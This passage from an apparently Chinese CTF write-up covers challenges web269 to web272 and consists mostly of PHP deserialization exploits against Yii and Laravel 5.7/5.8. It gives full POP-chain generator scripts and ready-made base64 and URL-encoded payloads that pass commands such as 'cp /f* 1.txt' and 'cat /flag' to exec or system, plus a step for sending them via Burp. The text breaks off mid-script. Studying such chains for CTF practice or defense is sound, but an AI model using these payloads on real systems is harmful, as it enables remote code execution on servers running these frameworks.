class_">RunProcess</span>()));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?r=<span class="comment">///backdoor/shell&amp;code=TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjE6e3M6NDM6IgBDb2RlY2VwdGlvblxFeHRlbnNpb25cUnVuUHJvY2VzcwBwcm9jZXNzZXMiO2E6MTp7aTowO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjk6ImlzUnVubmluZyI7YToyOntpOjA7TzoyMDoieWlpXHJlc3RcSW5kZXhBY3Rpb24iOjI6e3M6MTE6ImNoZWNrQWNjZXNzIjtzOjQ6ImV4ZWMiO3M6MjoiaWQiO3M6MTI6ImNwIC9mKiAxLnR4dCI7fWk6MTtzOjM6InJ1biI7fX19fX0=</span></span><br><span class="line">访问<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><h1 id="web269-Yii-plus-plus"><a href="#web269-Yii-plus-plus" class="headerlink" title="web269(Yii plus plus)"></a>web269(Yii plus plus)</h1><p>还有姿势！！</p><ul><li>想都不用想，上道题的payload还是用不了</li><li>换个新的<strong>exp</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">            <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;cp /f* 1.txt&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">        <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">phpDocumentor</span>\<span class="title class_">Reflection</span>\<span class="title class_">DocBlock</span>\<span class="title class_">Tags</span>&#123;</span><br><span class="line">        <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$description</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span>&#123;</span><br><span class="line">        <span class="title class_">use</span> <span class="title class_">phpDocumentor</span>\<span class="title class_">Reflection</span>\<span class="title class_">DocBlock</span>\<span class="title class_">Tags</span>\<span class="title class_">See</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$keys</span> = [];</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;path = <span class="keyword">new</span> <span class="title class_">See</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&quot;tingshuo&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;zheli&quot;</span>=&gt;<span class="string">&quot;suibianxie&quot;</span>)</span><br><span class="line">                );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 生成poc</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Swift_KeyCache_DiskKeyCache</span>()));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?r=<span class="comment">///backdoor/shell&amp;code=TzoyNzoiU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlIjoyOntzOjMzOiIAU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlAGtleXMiO2E6MTp7czo4OiJ0aW5nc2h1byI7YToxOntzOjU6InpoZWxpIjtzOjEwOiJzdWliaWFueGllIjt9fXM6MzM6IgBTd2lmdF9LZXlDYWNoZV9EaXNrS2V5Q2FjaGUAcGF0aCI7Tzo0MjoicGhwRG9jdW1lbnRvclxSZWZsZWN0aW9uXERvY0Jsb2NrXFRhZ3NcU2VlIjoxOntzOjE0OiIAKgBkZXNjcmlwdGlvbiI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NjoicmVuZGVyIjthOjI6e2k6MDtPOjIxOiJ5aWlccmVzdFxDcmVhdGVBY3Rpb24iOjI6e3M6MTE6ImNoZWNrQWNjZXNzIjtzOjQ6ImV4ZWMiO3M6MjoiaWQiO3M6MTI6ImNwIC9mKiAxLnR4dCI7fWk6MTtzOjM6InJ1biI7fX19fX0=</span></span><br><span class="line">访问<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><h1 id="web270-Yii-plus-plus-plus"><a href="#web270-Yii-plus-plus-plus" class="headerlink" title="web270(Yii plus plus plus)"></a>web270(Yii plus plus plus)</h1><ul><li>寻找新的<strong>exp</strong>中</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">        </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">        <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">        </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">          </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">        <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">        </span>&#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> &#123;</span><br><span class="line">        $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">exec</span>&#x27;, &#x27;<span class="title class_">cp</span> /<span class="title class_">f</span>* 1.<span class="title class_">txt</span>&#x27;);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?r=<span class="comment">///backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo0OiJleGVjIjtzOjI6ImlkIjtzOjEyOiJjcCAvZiogMS50eHQiO31pOjE7czozOiJydW4iO319fQ==</span></span><br><span class="line">访问<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><h1 id="web271-Laravel5-7"><a href="#web271-Laravel5-7" class="headerlink" title="web271(Laravel5.7)"></a>web271(Laravel5.7)</h1><ul><li>搜了一下注释发现这是个Laravel漏洞</li></ul><p>参考博客：</p><p><a href="https://blog.csdn.net/oiadkt/article/details/130343975">Laravel 远程代码执行漏洞</a><br><a href="https://blog.csdn.net/rfrder/article/details/113826483">laravel5.7 反序列化漏洞</a></p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span> &#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">PendingCommand</span> &#123;</span><br><span class="line">            <span class="title class_">public</span> $<span class="title class_">test</span>;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span>, <span class="variable">$app</span>, <span class="variable">$command</span>, <span class="variable">$parameters</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;test = <span class="variable">$test</span>;                 <span class="comment">//一个实例化的类 Illuminate\Auth\GenericUser</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;app = <span class="variable">$app</span>;                   <span class="comment">//一个实例化的类 Illuminate\Foundation\Application</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;command = <span class="variable">$command</span>;           <span class="comment">//要执行的php函数 system</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;     <span class="comment">//要执行的php函数的参数  array(&#x27;id&#x27;)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">Faker</span> &#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">DefaultGenerator</span>&#123;</span><br><span class="line">            <span class="title class_">protected</span> $<span class="title class_">default</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="keyword">default</span> = <span class="variable">$default</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span> &#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">Application</span>&#123;</span><br><span class="line">            <span class="title class_">protected</span> $<span class="title class_">instances</span> = [];</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$instances</span> = []</span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;instances[<span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>] = <span class="variable">$instances</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> &#123;</span><br><span class="line">        $<span class="title class_">defaultgenerator</span> = <span class="title class_">new</span> <span class="title class_">Faker</span>\<span class="title class_">DefaultGenerator</span>(<span class="title class_">array</span>(&quot;<span class="title class_">hello</span>&quot; =&gt; &quot;<span class="title class_">world</span>&quot;));</span><br><span class="line">        <span class="variable">$app</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Application</span>();</span><br><span class="line">        <span class="variable">$application</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Application</span>(<span class="variable">$app</span>);</span><br><span class="line">        <span class="variable">$pendingcommand</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Testing\PendingCommand</span>(<span class="variable">$defaultgenerator</span>, <span class="variable">$application</span>, <span class="string">&#x27;system&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;cat /flag&#x27;</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingcommand</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A4%3A%22test%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Ba%3A1%3A%7Bs%3A5%3A%22hello%22%3Bs%3A5%3A%22world%22%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A0%3A%7B%7D%7D%7D%7D%7Ds%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7D</span></span><br></pre></td></tr></table></figure><p><strong>payload:</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">burp抓包修改post值</span><br><span class="line"></span><br><span class="line">data=O%<span class="number">3</span>A44%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CFoundation%<span class="number">5</span>CTesting%<span class="number">5</span>CPendingCommand%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>test%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A22%<span class="number">3</span>A%<span class="number">22</span>Faker%<span class="number">5</span>CDefaultGenerator%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span><span class="keyword">default</span>%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>hello%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>world%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>app%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A33%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CFoundation%<span class="number">5</span>CApplication%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>instances%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A35%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CContracts%<span class="number">5</span>CConsole%<span class="number">5</span>CKernel%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A33%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CFoundation%<span class="number">5</span>CApplication%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>instances%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A35%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CContracts%<span class="number">5</span>CConsole%<span class="number">5</span>CKernel%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>command%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>parameters%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>cat+%<span class="number">2</span>Fflag%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><h1 id="web272-Laravel5-8"><a href="#web272-Laravel5-8" class="headerlink" title="web272(Laravel5.8)"></a>web272(Laravel5.8)</h1><p>寻找新的<strong>exp</strong>中。。。</p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">PhpParser</span>\<span class="title class_">Node</span>\<span class="title class_">Scalar</span>\<span class="title class_">MagicConst</span>&#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">Line</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span>&#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">MockDefinition</span> &#123;</span><br><span class="line">            <span class="title class_">protected</span> $<span class="title class_">config</span>;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>, <span class="variable">$code</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span>&#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">EvalLoader</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">Dispatcher</span> &#123;</span><br><span class="line">            <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$queueResolver</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;queueResolver = <span class="variable">$queueResolver</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">QueuedCommand</span> &#123;</span><br><span class="line">            <span class="title class_">public</span> $<span class="title class_">connection</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$connection</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;connection = <span class="variable">$connection</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">PendingBroadcast</span> &#123;</span><br><span class="line">            <span class="title class_">protected</span> $<span class="title class_">events</span>;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>, <span class="variable">$event</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span>&#123;</span><br><span class="line">        $<span class="title class_">line</span> = <span class="title class_">new</span> <span class="title class_">PhpParser</span>\<span class="title class_">Node</span>\<span class="title 